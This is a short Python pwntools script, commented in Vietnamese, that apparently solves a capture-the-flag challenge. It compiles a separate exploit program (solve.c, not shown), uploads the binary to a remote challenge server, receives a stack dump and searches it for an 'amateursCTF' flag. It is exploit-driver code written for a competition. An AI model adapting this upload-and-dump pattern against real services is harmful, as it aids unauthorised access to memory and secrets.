from pwn import *
import os

# Cấu hình
context.arch = 'amd64'
# p = process(['./chal']) 
p = remote('amt.rs', 8967)

# 1. Compile file exploit
os.system("gcc -static -nostdlib -o solve solve.c")

# 2. Đọc payload
with open('solve', 'rb') as f:
    payload = f.read()

log.info(f"Payload size: {len(payload)} bytes")

# 3. Gửi payload
p.recvuntil(b"elf bytes: ")
p.sendline(str(len(payload)).encode())

p.recvuntil(b"reading")
p.send(payload)

# Nhận dữ liệu dump
print("Receiving stack dump...")
try:
    # Đọc cho đến khi đóng kết nối hoặc timeout
    data = p.recvall(timeout=5)
except:
    pass

# Tìm flag trong data
import re
flag = re.search(b'amateursCTF{.*?}', data)
if flag:
    print("\n[+] FLAG FOUND:", flag.group().decode())
else:
    print("[-] Flag not found in dump. Check raw data.")

# 4. Nhận kết quả
p.interactive()